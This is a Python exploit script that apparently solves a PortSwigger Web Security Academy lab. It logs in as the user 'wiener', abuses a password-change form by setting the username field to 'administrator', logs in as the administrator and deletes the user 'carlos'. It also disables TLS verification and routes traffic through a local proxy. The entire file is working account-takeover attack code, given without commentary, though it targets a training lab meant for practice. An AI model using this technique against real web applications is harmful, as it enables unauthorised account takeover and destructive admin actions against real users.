import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a98000703bdf7a9853dc3e400af0034.web-security-academy.net"  #change to lab URL
username = "wiener"
password = "peter"

login_session = requests.session()
login_url = url + "/login"
r = login_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token is {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":username,"password":password}
r = login_session.post(login_url,verify=False,data=login_data,allow_redirects=False)
print("login success")

r = login_session.get(url+f"/my-account?id={username}",verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
csrf_token = match.group(1)
change_passdata = {"csrf":csrf_token,"username":"administrator","new-password-1":password,"new-password-2":password}
r = login_session.post(url+"/my-account/change-password",verify=False,data=change_passdata)
print("admin password changed")

admin_session = requests.session()
r = admin_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token is {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":"administrator","password":password}
r = admin_session.post(login_url,verify=False,data=login_data,allow_redirects=False)
print("login success as admin")
r = admin_session.get(url+"/admin/delete?username=carlos",verify=False)
print("Carlos deleted")